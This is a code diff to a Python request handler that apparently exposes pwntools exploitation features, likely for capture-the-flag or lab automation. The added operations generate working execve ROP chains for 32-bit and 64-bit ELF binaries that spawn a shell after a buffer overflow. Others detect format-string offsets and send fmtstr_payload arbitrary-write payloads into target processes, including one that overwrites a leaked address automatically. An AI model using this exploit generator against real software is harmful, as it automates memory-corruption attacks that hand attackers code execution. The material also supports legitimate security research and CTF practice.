@@ -16,6 +16,7 @@ from __future__ import annotations
 
 import json
 import os
+import re
 import sys
 import time
 
@@ -97,6 +98,126 @@ def _handle(request: dict) -> dict:
             ]
             gadgets.sort(key=lambda item: item["address"])
             return {"ok": True, "data": {"count": len(gadgets), "gadgets": gadgets[:300]}}
+        if op == "execve_chain":
+            from pwn import p32, p64
+
+            elf = _elf(request["path"])
+            shell = int(request["shell"])
+            offset = int(request["offset"])
+            rop = ROP(elf)
+
+            def find(insns):
+                try:
+                    return rop.find_gadget(insns).address
+                except Exception:  # noqa: BLE001
+                    return None
+
+            if elf.bits == 32:
+                pop_eax = find(["pop eax", "ret"])
+                pop_ebx = find(["pop ebx", "ret"])
+                pop_edx_ecx_ebx = find(["pop edx", "pop ecx", "pop ebx", "ret"])
+                pop_ecx_ebx = find(["pop ecx", "pop ebx", "ret"])
+                pop_edx = find(["pop edx", "ret"])
+                int80 = find(["int 0x80"])
+                missing = [name for name, value in (
+                    ("pop eax;ret", pop_eax), ("pop ebx;ret", pop_ebx),
+                    ("pop edx;pop ecx;pop ebx;ret", pop_edx_ecx_ebx),
+                    ("int 0x80", int80)) if value is None]
+                if pop_ecx_ebx is None and pop_edx_ecx_ebx is not None:
+                    missing = [item for item in missing
+                               if item != "pop edx;pop ecx;pop ebx;ret"]
+                if pop_edx_ecx_ebx is None and (pop_ecx_ebx is None or pop_edx is None):
+                    missing.append("pop ecx/pop edx")
+                if missing:
+                    return {"ok": True, "data": {"payload": None, "missing": missing}}
+                payload = b"A" * offset
+                payload += p32(pop_eax) + p32(11)
+                payload += p32(pop_ebx) + p32(shell)
+                if pop_edx_ecx_ebx is not None:
+                    payload += p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(shell)
+                else:
+                    payload += p32(pop_ecx_ebx) + p32(0) + p32(shell)
+                    payload += p32(pop_edx) + p32(0)
+                payload += p32(int80)
+                return {"ok": True, "data": {"payload": payload.hex(), "missing": []}}
+
+            pop_rax = find(["pop rax", "ret"])
+            pop_rdi = find(["pop rdi", "ret"])
+            pop_rsi = find(["pop rsi", "ret"])
+            pop_rdx = find(["pop rdx", "ret"])
+            syscall = find(["syscall"])
+            missing = [name for name, value in (
+                ("pop rax;ret", pop_rax), ("pop rdi;ret", pop_rdi),
+                ("pop rsi;ret", pop_rsi), ("pop rdx;ret", pop_rdx),
+                ("syscall", syscall)) if value is None]
+            if missing:
+                return {"ok": True, "data": {"payload": None, "missing": missing}}
+            payload = b"A" * offset
+            payload += p64(pop_rax) + p64(59)
+            payload += p64(pop_rdi) + p64(shell)
+            payload += p64(pop_rsi) + p64(0)
+            payload += p64(pop_rdx) + p64(0)
+            payload += p64(syscall)
+            return {"ok": True, "data": {"payload": payload.hex(), "missing": []}}
+        if op == "fmtstr":
+            elf = _elf(request["path"])
+            mode = request["mode"]
+            timeout = float(request.get("timeout", 3))
+            if mode == "offset":
+                io = process(elf.path)
+                io.sendline(b"AAAA." + b".%p" * 20)
+                output = io.recvall(timeout=timeout) or b""
+                io.close()
+                tokens = re.findall(rb"0x[0-9a-fA-F]+", output)
+                offset = None
+                for index, token in enumerate(tokens, 1):
+                    if int(token, 16) == 0x41414141:
+                        offset = index
+                        break
+                return {"ok": True, "data": {
+                    "offset": offset, "tokens": len(tokens),
+                    "output": output.decode("utf-8", "replace")[-400:]}}
+            if mode == "write":
+                from pwn import fmtstr_payload
+
+                writes = {int(key): int(value) for key, value in request["writes"].items()}
+                payload = fmtstr_payload(int(request["offset"]), writes,
+                                         write_size=request.get("write_size", "byte"))
+            else:
+                payload = bytes.fromhex(request["payload"])
+            io = process(elf.path)
+            io.send(payload + b"\n")
+            output = io.recvall(timeout=timeout) or b""
+            io.close()
+            return {"ok": True, "data": {
+                "payload_len": len(payload),
+                "output": output.decode("utf-8", "replace")[-600:]}}
+        if op == "fmtstr_auto":
+            from pwn import fmtstr_payload
+
+            elf = _elf(request["path"])
+            offset = int(request["offset"])
+            value = int(request.get("value", 16))
+            write_size = request.get("write_size", "byte")
+            io = process(elf.path, aslr=bool(request.get("aslr", False)))
+            address = request.get("address")
+            if address is None:
+                line = io.recvline(timeout=float(request.get("timeout", 3))) or b""
+                match = re.search(rb"0x[0-9a-fA-F]+", line)
+                if match is None:
+                    io.close()
+                    return {"ok": True, "data": {"solved": False,
+                                                 "error": "address_not_printed",
+                                                 "output": line.decode("utf-8", "replace")}}
+                address = int(match.group(0), 16)
+            payload = fmtstr_payload(offset, {int(address): value}, write_size=write_size)
+            io.send(payload + b"\n")
+            output = io.recvall(timeout=float(request.get("timeout", 3))) or b""
+            io.close()
+            return {"ok": True, "data": {
+                "solved": True, "address": int(address),
+                "payload_len": len(payload),
+                "output": output.decode("utf-8", "replace")[-600:]}}
         if op == "facts":
             elf = _elf(request["path"])
             plt = {name: int(address) for name, address in elf.plt.items()}
